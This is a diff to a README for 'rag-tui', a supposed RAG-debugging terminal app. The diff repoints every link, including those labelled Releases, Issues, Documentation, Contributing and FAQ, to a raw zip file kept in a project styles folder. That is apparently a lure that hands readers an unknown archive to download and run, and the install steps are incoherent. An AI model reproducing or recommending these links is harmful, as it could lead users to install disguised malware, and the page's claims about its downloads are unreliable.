@@ -1,6 +1,6 @@
 # ⚡ rag-tui - Debug Your RAG Pipeline Easily
 
-[![Download rag-tui](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip)](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip)
+[![Download rag-tui](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip)](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip)
 
 ## 📖 Description
 
@@ -19,9 +19,9 @@ To get started, you need to download and run rag-tui. Follow the steps below to 
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip) to download the latest version of rag-tui.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip) to download the latest version of rag-tui.
 2. Look for the latest release at the top. Click on the version you want to download.
-3. Choose the suitable file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, `https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip` for Linux).
+3. Choose the suitable file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, `https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip` for Linux).
 4. Download the selected file to your computer.
 
 ### 💻 Running rag-tui
@@ -31,7 +31,7 @@ Once the download is complete, follow these steps to run rag-tui:
 1. Locate the downloaded file in your downloads folder.
 2. If you downloaded an executable file (e.g., `.exe` for Windows), double-click it to start the installation process.
    - For macOS, double-click the `.dmg` file, then drag the rag-tui app into your Applications folder.
-   - For Linux, extract the `https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip` file and follow the README instructions inside for installation.
+   - For Linux, extract the `https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip` file and follow the README instructions inside for installation.
 3. After installation, find the rag-tui application in your menu or applications list.
 4. Click on the icon or run it from the terminal using the command `rag-tui` to start using the application.
 
@@ -72,19 +72,19 @@ After launching rag-tui, you'll see a straightforward terminal interface. Here�
 
 If you encounter issues that you cannot resolve, consider reaching out for help:
 
-- Check the [GitHub Issues](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip) page. You may find solutions to common problems.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip) page. You may find solutions to common problems.
 - Leave a question, and the community or developers may assist you.
 
 ## 🔗 Additional Resources
 
-- Official Documentation: [Documentation Link](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip)
-- Contribution Guidelines: [Contributing](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip)
-- FAQs: Visit the [FAQ Section](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip) to find answers to common queries.
+- Official Documentation: [Documentation Link](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip)
+- Contribution Guidelines: [Contributing](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip)
+- FAQs: Visit the [FAQ Section](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip) to find answers to common queries.
 
 ## 📄 License
 
 rag-tui is open-source software licensed under the MIT License. You can use, modify, and distribute it as per the terms of the license.
 
-[![Download rag-tui](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip)](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/tests/tui_rag_2.0.zip)
+[![Download rag-tui](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip)](https://raw.githubusercontent.com/Saurabhsoorya/rag-tui/main/rag_tui/styles/rag_tui_v3.0.zip)
 
 Feel free to reach out to the community for support or feedback!
